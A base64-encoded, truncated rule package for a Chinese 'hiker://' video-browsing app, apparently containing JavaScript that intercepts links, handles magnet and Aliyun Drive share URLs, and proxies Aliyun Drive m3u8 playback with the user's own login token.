XFxcIlxcXFxuICAgICAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgYnJlYWs7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9IGNhdGNoIChlKSB7XFxcXG4gICAgICAgIGxvZyhlLnRvU3RyaW5nKCkpXFxcXG4gICAgfVxcXFxuICAgIHNldFJlc3VsdChkKTtcXFxcbn1cXFxcbmxldCByID0gZ2V0SXRlbShcXFxcXFxcInJ1bGVcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG5sZXQgcyA9IGdldE15VmFyKCdzJywgJycpfHxNWV9QQVJBTVMuc2VhcmNoVGVybXN8fGRlY29kZVVSSUNvbXBvbmVudChnZXRQYXJhbShcXFxcXFxcInNlYXJjaFRlcm1zXFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIpKTtcXFxcbmxldCBzZWFyY2hNb2RlID0gZ2V0U2VhcmNoTW9kZSgpO1xcXFxubGV0IG9wZW5Nb2RlID0gZ2V0SXRlbShcXFxcXFxcIm9wZW5Nb2RlXFxcXFxcXCIsIFxcXFxcXFwi5pys5Zyw6L2s56CBXFxcXFxcXCIpO1xcXFxubGV0IGlkID0gRGF0ZS5ub3coKSArIE1ZX1JVTEUudGl0bGU7XFxcXG5sZXQgZCA9IFtdO1xcXFxuaWYgKE1ZX1BBR0UgPT09IDEpIHtcXFxcbiAgICBzZXRIZWFkKCk7XFxcXG4gICAgaWYgKCFzKSB7XFxcXG4gICAgICAgIHNldEhpc3RvcnkoKTtcXFxcbiAgICB9XFxcXG59XFxcXG5pZiAocykge1xcXFxuICAgIHJlY29yZCgpXFxcXG4gICAgc2VhcmNoRW5kKCk7XFxcXG59IGVsc2UgaWYgKE1ZX1BBR0UgPT09IDEpIHtcXFxcbiAgICBzZXRUcmVuZGluZ1RhYkVuZCgpO1xcXFxufVxcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIue9kemhtea1j+iniFxcXCIsXFxcInBhdGhcXFwiOlxcXCJ5c2Z4XFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxudmFyIGQgPSBbXTtcXFxcblxcXFxubGV0IG9wZW5Nb2RlID0gZ2V0SXRlbShcXFxcXFxcIm9wZW5Nb2RlXFxcXFxcXCIpO1xcXFxubGV0IHJ1bGUgPSBNWV9SVUxFLnRpdGxlO1xcXFxubGV0IHVybCA9IGRlY29kZVVSSUNvbXBvbmVudChnZXRQYXJhbShcXFxcXFxcIndlYlVybFxcXFxcXFwiLFxcXFxcXFwiXFxcXFxcXCIpKTtcXFxcblxcXFxuZnVuY3Rpb24gaW50ZXJjZXB0KHJ1bGUsIG9yaWdpbiwgb3Blbk1vZGUpIHtcXFxcbiAgICBsZXQgaG9zdCA9IG9yaWdpbi5yZXBsYWNlKG5ldyBSZWdFeHAoXFxcXFxcXCJodHRwOi8vfGh0dHBzOi8vXFxcXFxcXCIpLCBcXFxcXFxcIlxcXFxcXFwiKS5zcGxpdChcXFxcXFxcIi9cXFxcXFxcIilbMF07XFxcXG4gICAgbGV0IGhvc3RzID0gaG9zdC5zcGxpdChcXFxcXFxcIi5cXFxcXFxcIik7XFxcXG4gICAgaWYgKGhvc3RzLmxlbmd0aCA+IDIpIHtcXFxcbiAgICAgICAgaG9zdCA9IGhvc3RzW2hvc3RzLmxlbmd0aCAtIDJdICsgXFxcXFxcXCIuXFxcXFxcXCIgKyBob3N0c1tob3N0cy5sZW5ndGggLSAxXTtcXFxcbiAgICB9XFxcXG4gICAgaWYgKGlucHV0LnN0YXJ0c1dpdGgoXFxcXFxcXCJtYWduZXRcXFxcXFxcIikpIHtcXFxcbiAgICAgICAgY29uZmlybSh7XFxcXG4gICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLmuKnppqjmj5DnpLpcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGNvbnRlbnQ6IFxcXFxcXFwi5qOA5rWL5Yiw5paw55qE56OB6ZO+5Zyw5Z2A77yM54K55Ye756Gu5a6a5oyJ6ZKu5Y2z5Y+v5pKt5pS+77yM54K55Ye75Y+W5raI5oyJ6ZKu5Y+v5Lul5aSN5Yi26ZO+5o6lXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBjb25maXJtOiAkLnRvU3RyaW5nKChtYWcpID0+IHtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gbWFnO1xcXFxuICAgICAgICAgICAgfSwgaW5wdXQpLFxcXFxuICAgICAgICAgICAgY2FuY2VsOiAkLnRvU3RyaW5nKChtYWcpID0+IHtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJjb3B5Oi8vXFxcXFxcXCIgKyBtYWdcXFxcbiAgICAgICAgICAgIH0sIGlucHV0KVxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgcmV0dXJuIHRydWU7XFxcXG4gICAgfSBlbHNlIGlmIChpbnB1dC5pbmNsdWRlcyhcXFxcXFxcImFsaXl1bmRyaXZlLmNvbVxcXFxcXFwiKSAmJiBvcGVuTW9kZSAhPSBcXFxcXFxcIuWumOaWuUFQUFxcXFxcXFwiKSB7XFxcXG4gICAgICAgIGxvZyhpbnB1dCk7XFxcXG4gICAgICAgIGlmIChpbnB1dC5pbmNsdWRlcygnY2hlY2t1cmw/dXJsPScpICYmIGlucHV0LmluY2x1ZGVzKCcmdXJscmVmZXInKSkge1xcXFxuICAgICAgICAgICAgaW5wdXQgPSBkZWNvZGVVUklDb21wb25lbnQoaW5wdXQuc3BsaXQoJyZ1cmxyZWZlcicpWzBdLnNwbGl0KCdjaGVja3VybD91cmw9JylbMV0pO1xcXFxuICAgICAgICAgICAgLy9sb2coJ+i0tOWQpycraW5wdXQpO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHJldHVybiAkLnRvU3RyaW5nKCh1cmwsIHJ1bGUpID0+IHtcXFxcbiAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAub3BlbihKU09OLnN0cmluZ2lmeSh7XFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi6Zi/6YeM5LqR55uYXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vcGFnZS9hbGl5dW4/cGFnZT1meXBhZ2UmcmVhbHVybD1cXFxcXFxcIiArIGVuY29kZVVSSUNvbXBvbmVudCh1cmwpICsgXFxcXFxcXCImcnVsZT1cXFxcXFxcIiArIHJ1bGUsXFxcXG4gICAgICAgICAgICB9KSlcXFxcbiAgICAgICAgfSwgaW5wdXQsIHJ1bGUpO1xcXFxuICAgIH0gZWxzZSBpZiAoL1xcXFxcXFxcLihtcDN8ZmxhY3xtNGEpJC8udGVzdChpbnB1dCkpIHtcXFxcbiAgICAgICAgbG9nKGlucHV0KTtcXFxcbiAgICAgICAgcmV0dXJuICQudG9TdHJpbmcoKHVybCwgcnVsZSkgPT4ge1xcXFxuICAgICAgICAgICAgZnlfYnJpZGdlX2FwcC5wbGF5VmlkZW8odXJsKTtcXFxcbiAgICAgICAgfSwgaW5wdXQsIHJ1bGUpO1xcXFxuICAgIH0gZWxzZSBpZiAoIWlucHV0LmluY2x1ZGVzKGhvc3QpICYmIGlucHV0LnN0YXJ0c1dpdGgoXFxcXFxcXCJodHRwXFxcXFxcXCIpKSB7XFxcXG4gICAgICAgIGxvZyhpbnB1dCk7XFxcXG4gICAgICAgIHJldHVybiAkLnRvU3RyaW5nKCh1cmwsIHJ1bGUpID0+IHtcXFxcbiAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAub3BlbihKU09OLnN0cmluZ2lmeSh7XFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi6K+m5oOFXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vcGFnZS95c2Z4P3dlYlVybD1cXFxcXFxcIitlbmNvZGVVUklDb21wb25lbnQodXJsKStcXFxcXFxcIiZydWxlPVxcXFxcXFwiK3J1bGUsXFxcXG4gICAgICAgICAgICB9KSlcXFxcbiAgICAgICAgfSwgaW5wdXQsIHJ1bGUpO1xcXFxuICAgIH0gZWxzZSBpZiAoIWlucHV0LnN0YXJ0c1dpdGgoXFxcXFxcXCJodHRwXFxcXFxcXCIpKSB7XFxcXG4gICAgICAgIGxvZyhpbnB1dCk7XFxcXG4gICAgICAgIC8v6IO95ZSk6LW3QVBQ55qE55m95ZCN5Y2VXFxcXG4gICAgICAgIGxldCB3aGl0ZSA9IFtcXFxcbiAgICAgICAgICAgIFxcXFxcXFwicWtsaW5rXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBcXFxcXFxcImJkbmV0ZGlza1xcXFxcXFwiLFxcXFxuICAgICAgICAgICAgXFxcXFxcXCJ4dW5sZWlhcHBcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIFxcXFxcXFwic21hcnRkcml2ZVxcXFxcXFwiXFxcXG4gICAgICAgIF07XFxcXG4gICAgICAgIGxldCBpbldoaXRlID0gd2hpdGUuZmlsdGVyKGl0ID0+IGlucHV0LnN0YXJ0c1dpdGgoaXQpKS5sZW5ndGggPiAwO1xcXFxuICAgICAgICBpZiAoIWluV2hpdGUpIHtcXFxcbiAgICAgICAgICAgIHJldHVybiBmYWxzZTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICByZXR1cm4gJC50b1N0cmluZygodXJsLCBydWxlKSA9PiB7XFxcXG4gICAgICAgICAgICBmeV9icmlkZ2VfYXBwLm9wZW5UaGlyZEFwcCAmJiBmeV9icmlkZ2VfYXBwLm9wZW5UaGlyZEFwcCh1cmwpO1xcXFxuICAgICAgICB9LCBpbnB1dCwgcnVsZSk7XFxcXG4gICAgfVxcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBsb2FkSnMoKSB7XFxcXG4gICAgdHJ5IHtcXFxcbiAgICAgICAgaWYgKGRvY3VtZW50LnRpdGxlICYmIGRvY3VtZW50LnRpdGxlLmxlbmd0aCkge1xcXFxuICAgICAgICAgICAgbGV0IHIgPSAkJCQoKS5sYXp5UnVsZSgodCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIHNldFBhZ2VUaXRsZSh0KTtcXFxcbiAgICAgICAgICAgIH0sIGRvY3VtZW50LnRpdGxlKTtcXFxcbiAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAucGFyc2VMYXp5UnVsZShyKTtcXFxcbiAgICAgICAgfVxcXFxuICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgZnlfYnJpZGdlX2FwcC5sb2coZS50b1N0cmluZygpKTtcXFxcbiAgICB9XFxcXG59XFxcXG5cXFxcbmQucHVzaCh7XFxcXG4gICAgdXJsOiB1cmwsXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwieDVfd2Vidmlld19zaW5nbGVcXFxcXFxcIixcXFxcbiAgICBkZXNjOiBcXFxcXFxcIjEwMCUmJmZsb2F0XFxcXFxcXCIsXFxcXG4gICAgZXh0cmE6IHtcXFxcbiAgICAgICAgdXJsSW50ZXJjZXB0b3I6ICQudG9TdHJpbmcoaW50ZXJjZXB0LCBydWxlLCBnZXRIb21lKHVybCksIG9wZW5Nb2RlKSxcXFxcbiAgICAgICAganM6ICQudG9TdHJpbmcobG9hZEpzKSxcXFxcbiAgICAgICAgY2FuQmFjazogdHJ1ZSxcXFxcbiAgICAgICAganNMb2FkaW5nSW5qZWN0OiB0cnVlLFxcXFxuICAgICAgICBmbG9hdFZpZGVvOiB0cnVlXFxcXG4gICAgfVxcXFxufSk7XFxcXG5cXFxcbnNldFJlc3VsdChkKTtcXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLpmL/ph4xMYXp5XFxcIixcXFwicGF0aFxcXCI6XFxcImFsaWxhenlcXFwiLFxcXCJydWxlXFxcIjpcXFwiY29uc3QgQWxpQWNjZXNzQXBpID0gJC5yZXF1aXJlKFxcXFxcXFwiYWxpUGxheUFwaVxcXFxcXFwiKTtcXFxcbmNvbnN0IHtcXFxcbiAgICBvcGVuVG9rZW5zRmlsZXBhdGgsXFxcXG4gICAgYWxpVG9rZW5zRmlsZXBhdGhcXFxcbn0gPSAkLnJlcXVpcmUoXFxcXFxcXCJ0b2tlblBhdGhcXFxcXFxcIik7XFxcXG5cXFxcbmZ1bmN0aW9uIGFsaU0zdThQcm94eShmaWxlSWQsIHNoYXJlSWQsIHNoYXJlUHdkLCBzaGFyZVRva2VuLCBhbGlUb2tlbiwgdGl0bGUpIHtcXFxcbiAgICBmdW5jdGlvbiBnZXRBbGlQbGF5VXJsKGZpbGVJZCwgbGluZSkge1xcXFxuICAgICAgICBsZXQgYWxpdXJsO1xcXFxuICAgICAgICB0cnkge1xcXFxuICAgICAgICAgICAgY29uc3QgQWxpQWNjZXNzQXBpID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL2FsaVBsYXlBcGk/cnVsZT1cXFxcXFxcIiArIHRpdGxlKTtcXFxcbiAgICAgICAgICAgIGxldCBhbGlBY2Nlc3NBcGkgPSBBbGlBY2Nlc3NBcGkuY3JlYXRlRGVmYXVsdChzaGFyZUlkLCBzaGFyZVB3ZCwgc2hhcmVUb2tlbiwgYWxpVG9rZW4sIG51bGwsIHRpdGxlKTtcXFxcbiAgICAgICAgICAgIGxldCBwbGF5VXJsTGlzdCA9IGFsaUFjY2Vzc0FwaS5nZXRTaGFyZVZpZGVvUHJldmlldyhmaWxlSWQpIHx8IFtdO1xcXFxuICAgICAgICAgICAgcGxheVVybExpc3QuZm9yRWFjaCgoaXRlbSkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIGlmIChpdGVtLnRlbXBsYXRlX2lkID09IGxpbmUpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgYWxpdXJsID0gaXRlbS51cmw7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgICAgIGxvZyhlLnRvU3RyaW5nKCkpO1xcXFxuICAgICAgICAgICAgdGhyb3cgZTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICByZXR1cm4gYWxpdXJsO1xcXFxuICAgIH1cXFxcblxcXFxuICAgIGZ1bmN0aW9uIGdldE0zdThDb250ZW50KHBsYXl1cmwpIHtcXFxcblxcXFxuICAgICAgICAvL2xvZyhcXFxcXFxcIuaIkeWcqOS7o+eQhlxcXFxcXFwiICsgcGxheXVybCk7XFxcXG4gICAgICAgIGxldCBob21lID0gcGxheXVybC5zcGxpdCgnbWVkaWEubTN1OCcpWzBdO1xcXFxuICAgICAgICBsZXQgZiA9IGZldGNoKHBsYXl1cmwsIHtcXFxcbiAgICAgICAgICAgIGhlYWRlcnM6IHtcXFxcbiAgICAgICAgICAgICAgICAnUmVmZXJlcic6ICdodHRwczovL3d3dy5hbGl5dW5kcml2ZS5jb20vJ1xcXFxuICAgICAgICAgICAgfSxcXFxcbiAgICAgICAgICAgIHRpbWVvdXQ6IDMwMDBcXFxcbiAgICAgICAgfSkuc3BsaXQoXFxcXFxcXCJcXFxcXFxcXG5cXFxcXFxcIik7XFxcXG4gICAgICAgIGxldCBmZiA9IGYubWFwKGl0ID0+IHtcXFxcbiAgICAgICAgICAgIGlmIChpdC5zdGFydHNXaXRoKFxcXFxcXFwibWVkaWEtXFxcXFxcXCIpKSB7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiL3Byb3h5P3VybD1cXFxcXFxcIiArIGJhc2U2NEVuY29kZShob21lICsgaXQpO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgcmV0dXJuIGl0O1xcXFxuICAgICAgICB9KS5qb2luKFxcXFxcXFwiXFxcXFxcXFxuXFxcXFxcXCIpO1xcXFxuICAgICAgICAvL2xvZygndWZpZC0nICsgZmlsZWlkKTtcXFxcbiAgICAgICAgd3JpdGVGaWxlKCdoaWtlcjovL2ZpbGVzL19jYWNoZS8nICsgZmlsZUlkICsgJy5tM3U4JywgZmYpO1xcXFxuICAgICAgICByZXR1cm4gZmY7XFxcXG4gICAgfVxcXFxuXFxcXG4gICAgZnVuY3Rpb24gdXBkYXRlVHNVcmwodXJsKSB7XFxcXG4gICAgICAgIGxldCBmaWQgPSB1cmwuc3BsaXQoJyZmPScpWzFdLnNwbGl0KCcmJylbMF07XFxcXG4gICAgICAgIC8vbG9nKCdzZmlkLScgKyBmaWQpO1xcXFxuICAgICAgICBsZXQgZiA9IGZldGNoKCdoaWtlcjovL2ZpbGVzL19jYWNoZS8nICsgZmlkICsgJy5tM3U4Jykuc3BsaXQoXFxcXFxcXCJcXFxcXFxcXG5cXFxcXFxcIik7XFxcXG4gICAgICAgIGYuZm9yRWFjaChpdCA9PiB7XFxcXG4gICAgICAgICAgICBpZiAoaXQgJiYgaXQuc3RhcnRzV2l0aCgnL3Byb3h5P3VybD0nKSkge1xcXFxuICAgICAgICAgICAgICAgIGxldCBmdXJsID0gYmFzZTY0RGVjb2RlKGl0LnJlcGxhY2UoJy9wcm94eT91cmw9JywgJycpKTtcXFxcbiAgICAgICAgICAgICAgICBpZiAodXJsLnN1YnN0cih1cmwuaW5kZXhPZignL21lZGlhLScpLCB1cmwuaW5kZXhPZignLnRzJykpID09IGZ1cmwuc3Vic3RyKGZ1cmwuaW5kZXhPZignL21lZGlhLScpLCBmdXJsLmluZGV4T2YoJy50cycpKSkge1xcXFxuICAgICAgICAgICAgICAgICAgICB1cmwgPSBmdXJsO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSlcXFxcbiAgICAgICAgbGV0IGV4cGlyZXMgPSB1cmwuc3BsaXQoJ3gtb3NzLWV4cGlyZXM9JylbMV0uc3BsaXQoJyYnKVswXTtcXFxcbiAgICAgICAgY29uc3QgbGFzdHRpbWUgPSBwYXJzZUludChleHBpcmVzKSAtIERhdGUubm93KCkgLyAxMDAwO1xcXFxuICAgICAgICBpZiAobGFzdHRpbWUgPCA2MCkge1xcXFxuICAgICAgICAgICAgLy9sb2coJ+i/h+acn+abtOaWsCcpXFxcXG4gICAgICAgICAgICBsZXQgbGluZSA9IHVybC5zcGxpdCgnL21lZGlhJylbMF07IC8v5Y+W5LmL5YmN5pKt5pS+55qEdHPmrrXnur/ot69cXFxcbiAgICAgICAgICAgIGxpbmUgPSBsaW5lLnN1YnN0cmluZyhsaW5lLmxhc3RJbmRleE9mKCcvJykgKyAxKTtcXFxcbiAgICAgICAgICAgIGxldCBmID0gZ2V0TTN1OENvbnRlbnQoZ2V0QWxpUGxheVVybChmaWQsIGxpbmUpKS5zcGxpdChcXFxcXFxcIlxcXFxcXFxcblxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIGYuZm9yRWFjaChpdCA9PiB7XFxcXG4gICAgICAgICAgICAgICAgaWYgKGl0ICYmIGl0LnN0YXJ0c1dpdGgoJy9wcm94eT91cmw9JykpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IGZ1cmwgPSBiYXNlNjREZWNvZGUoaXQucmVwbGFjZSgnL3Byb3h5P3VybD0nLCAnJykpO1xcXFxuICAgICAgICAgICAgICAgICAgICBpZiAodXJsLnN1YnN0cih1cmwuaW5kZXhPZignL21lZGlhLScpLCB1cmwuaW5kZXhPZignLnRzJykpID09IGZ1cmwuc3Vic3RyKGZ1cmwuaW5kZXhPZignL21lZGlhLScpLCBmdXJsLmluZGV4T2YoJy50cycpKSkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgdXJsID0gZnVybDtcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH0pXFxcXG5cXFxcbiAgICAgICAgfVxcXFxuICAgICAgICByZXR1cm4gdXJsO1xcXFxuICAgIH1cXFxcbiAgICB0cnkge1xcXFxuICAgICAgICBsZXQgdXJsID0gYmFzZTY0RGVjb2RlKE1ZX1BBUkFNUy51cmwpO1xcXFxuICAgICAgICBpZiAodXJsLmluY2x1ZGVzKFxcXFxcXFwiLnRzXFxcXFxcXCIpKSB7XFxcXG4gICAgICAgICAgICByZXR1cm4gSlNPTi5zdHJpbmdpZnkoe1xcXFxuICAgICAgICAgICAgICAgIHN0YXR1c0NvZGU6IDMwMixcXFxcbiAgICAgICAgICAgICAgICBoZWFkZXJzOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwiTG9jYXRpb25cXFxcXFxcIjogdXBkYXRlVHNVcmwodXJsKSxcXFxcbiAgICAgICAgICAgICAgICAgICAgJ1JlZmVyZXInOiAnaHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tLydcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIC8vbG9nKHVybCk7XFxcXG4gICAgICAgICAgICBsZXQgZmYgPSBnZXRNM3U4Q29udGVudChnZXRBbGlQbGF5VXJsKGZpbGVJZCwgTVlfUEFSQU1TLnRlbXBsYXRlSWQpKTtcXFxcbiAgICAgICAgICAgIHJldHVybiBmZjtcXFxcbiAgICAgICAgfVxcXFxuICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgbG9nKFxcXFxcXFwi5Luj55CG5pKt5pS+5aSx6LSlI1xcXFxcXFxcbumUmeivr+S/oeaBrz5cXFxcXFxcIiArIGUudG9TdHJpbmcoKSArIFxcXFxcXFwiXFxcXFxcXFxu6ZSZ6K+v6KGMPlxcXFxcXFwiICsgZS5saW5lTnVtYmVyKTtcXFxcbiAgICB9XFxcXG59XFxcXG5cXFxcblxcXFxuZnVuY3Rpb24gZ2V0VmlkZW8oYWxpQWNjZXNzQXBpLCBmaWxlSWQpIHtcXFxcblxcXFxuICAgIGxldCBwbGF5VXJsTGlzdCA9IGFsaUFjY2Vzc0FwaS5nZXRTaGFyZVZpZGVvUHJldmlldyhmaWxlSWQpIHx8IFtdO1xcXFxuXFxcXG4gICAgbGV0IHNlcnZlckFkZHJlc3MgPSBzdGFydFByb3h5U2VydmVyKCQudG9TdHJpbmcoYWxpTTN1OFByb3h5LCBmaWxlSWQsIGFsaUFjY2Vzc0FwaS5zaGFyZUlkLCBhbGlBY2Nlc3NBcGkuc2hhcmVQd2QsIGFsaUFjY2Vzc0FwaS5zaGFyZVRva2VuLCBhbGlBY2Nlc3NBcGkuYWxpVG9rZW4sIE1ZX1JVTEUudGl0bGUpKTtcXFxcbiAgICBsZXQgdHJhbnNjb2RpbmcgPSB7XFxcXG4gICAgICAgIFVIRDogXFxcXFxcXCI0SyDotoXmuIVcXFxcXFxcIixcXFxcbiAgICAgICAgUUhEOiBcXFxcXFxcIjJLIOi2hea4hVxcXFxcXFwiLFxcXFxuICAgICAgICBGSEQ6IFxcXFxcXFwiMTA4MCDlhajpq5jmuIVcXFxcXFxcIixcXFxcbiAgICAgICAgSEQ6IFxcXFxcXFwiNzIwIOmrmOa4hVxcXFxcXFwiLFxcXFxuICAgICAgICBTRDogXFxcXFxcXCI1NDAg5qCH5riFXFxcXFxcXCIsXFxcXG4gICAgICAgIExEOiBcXFxcXFxcIjM2MCDmtYHnlYVcXFxcXFxcIlxcXFxuICAgIH07XFxcXG5cXFxcbiAgICBpZiAocGxheVVybExpc3QubGVuZ3RoID4gMCkge1xcXFxuICAgICAgICBsZXQgdXJscyA9IFtdLFxcXFxuICAgICAgICAgICAgbmFtZXMgPSBbXTtcXFxcbiAgICAgICAgcGxheVVybExpc3QuZm9yRWFjaCgoaXRlbSkgPT4ge1xcXFxuICAgICAgICAgICAgdXJscy5wdXNoKHNlcnZlckFkZHJlc3MgKyBcXFxcXFxcIj91cmw9XFxcXFxcXCIgKyBiYXNlNjRFbmNvZGUoaXRlbS51cmwpICsgXFxcXFxcXCImdGVtcGxhdGVJZD1cXFxcXFxcIiArIGl0ZW0udGVtcGxhdGVfaWQgKyBcXFxcXFxcIiMubTN1OFxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIG5hbWVzLnB1c2godHJhbnNjb2RpbmdbaXRlbS50ZW1wbGF0ZV9pZF0gPyB0cmFuc2NvZGluZ1tpdGVtLnRlbXBsYXRlX2lkXSA6IGl0ZW0udGVtcGxhdGVfaGVpZ2h0KTtcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgICAgIGxldCBoZWFkcyA9IG5ldyBBcnJheShwbGF5VXJsTGlzdC5sZW5ndGgpLmZpbGwoe1xcXFxuICAgICAgICAgICAgJ1JlZmVyZXInOiAnaHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tLydcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgICAgIHJldHVybiB7XFxcXG4gICAgICAgICAgICB1cmxzOiB1cmxzLFxcXFxuICAgICAgICAgICAgbmFtZXM6IG5hbWVzLFxcXFxuICAgICAgICAgICAgaGVhZGVyczogaGVhZHMsXFxcXG4gICAgICAgIH07XFxcXG4gICAgfSBlbHNlIHtcXFxcbiAgICAgICAgcmV0dXJuIHt9O1xcXFxuICAgIH1cXFxcblxcXFxufTtcXFxcblxcXFxuXFxcXG5mdW5jdGlvbiBnZXRPcmlWaWRlbyhhbGlBY2Nlc3NBcGksIGZpbGVJZCkge1xcXFxuICAgIHJldHVybiB7XFxcXG4gICAgICAgIG5hbWVzOiBbXFxcXFxcXCLljp/nlLtcXFxcXFxcIl0sXFxcXG4gICAgICAgIHVybHM6IFthbGlBY2Nlc3NBcGkuZ2V0VmlkZW9UZW1QbGF5VXJsKGZpbGVJZCkgKyBcXFxcXFxcIiNpc1ZpZGVvPXRydWUjXFxcXFxcXCJdLFxcXFxuICAgICAgICBoZWFkZXJzOiBbe1xcXFxuICAgICAgICAgICAgJ1JlZmVyZXInOiAnaHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tLydcXFxcbiAgICAgICAgfV1cXFxcbiAgICB9O1xcXFxufVxcXFxuJC5leHBvcnRzID0gZnVuY3Rpb24oc2hhcmVJZCwgc2hhcmVQd2QsIHNoYXJlVG9rZW4sIGZpbGVJZCwgY2F0ZSwgemltdSkge1xcXFxuICAgIGlmICghZmlsZUV4aXN0KGFsaVRva2Vuc0ZpbGVwYXRoKSkge1xcXFxuICAgICAgICB0b2FzdChcXFxcXFxcIuivt+WFiOeZu+mZhueZu+W9lei0puWPt1xcXFxcXFwiKTtcXFxcbiAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9wYWdlL2xvZ2luI25vUmVjb3JkSGlzdG9yeSMjbm9IaXN0b3J5Iz9ub1JlZnJlc2g9MVxcXFxcXFwiO1xcXFxuICAgIH1cXFxcbiAgICBsZXQgYWxpVG9rZW4gPSAkLnJlcXVpcmUoYWxpVG9rZW5zRmlsZXBhdGgpO1xcXFxuICAgIGlmIChjYXRlID09PSBcXFxcXFxcInZpZGVvXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgbGV0IHBsYXlMaXN0ID0gW107XFxcXG4gICAgICAgIGxldCBhbGlBY2Nlc3NBcGk7XFxcXG4gICAgICAgIGxldCBwbGF5TW9kZSA9IGdldEl0ZW0oXFxcXFxcXCJhbGl5dW5fcGxheU1vZGVcXFxcXFxcIiwgXFxcXFxcXCLovaznoIFcXFxcXFxcIik7XFxcXG4gICAgICAgIHRyeSB7XFxcXG4gICAgICAgICAgICBhbGlBY2Nlc3NBcGkgPSBBbGlBY2Nlc3NBcGkuY3JlYXRlRGVmYXVsdChzaGFyZUlkLCBzaGFyZVB3ZCwgc2hhcmVUb2tlbiwgYWxpVG9rZW4pO1xcXFxuICAgICAgICAgICAgaWYgKHBsYXlNb2RlID09PSBcXFxcXFxcIui9rOeggVxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICAgICAgcGxheUxpc3QgPSBnZXRWaWRlbyhhbGlBY2Nlc3NBcGksIGZpbGVJZCkgfHwge307XFxcXG4gICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgIHBsYXlMaXN0ID0gZ2V0T3JpVmlkZW8oYWxpQWNjZXNzQXBpLCBmaWxlSWQpO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9IGNhdGNoIChlKSB7XFxcXG4gICAgICAgICAgICBsb2coXFxcXFxcXCIjXFxcXFxcXCIgKyBwbGF5TW9kZSArIFxcXFxcXFwi5pKt5pS+5aSx6LSlI1xcXFxcXFxcbumUmeivr+S/oeaBrz5cXFxcXFxcIiArIGUudG9TdHJpbmcoKSArIFxcXFxcXFwiXFxcXFxcXFxu6ZSZ6K+v6KGMPlxcXFxcXFwiICsgZS5saW5lTnVtYmVyKTtcXFxcbiAgICAgICAgICAgIGlmIChlLmNvZGUgPT09IFxcXFxcXFwiSW52YWxpZFBhcmFtZXRlci5SZWZyZXNoVG9rZW5cXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgICAgIHRvYXN0KFxcXFxcXFwi55m76ZmG6L+H5pyf77yM6K+36YeN5paw55m76ZmGXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vcGFnZS9sb2dpbiNub1JlY29yZEhpc3RvcnkjI25vSGlzdG9yeSM/bm9SZWZyZXNoPTFcXFxcXFxcIjtcXFxcbiAgIC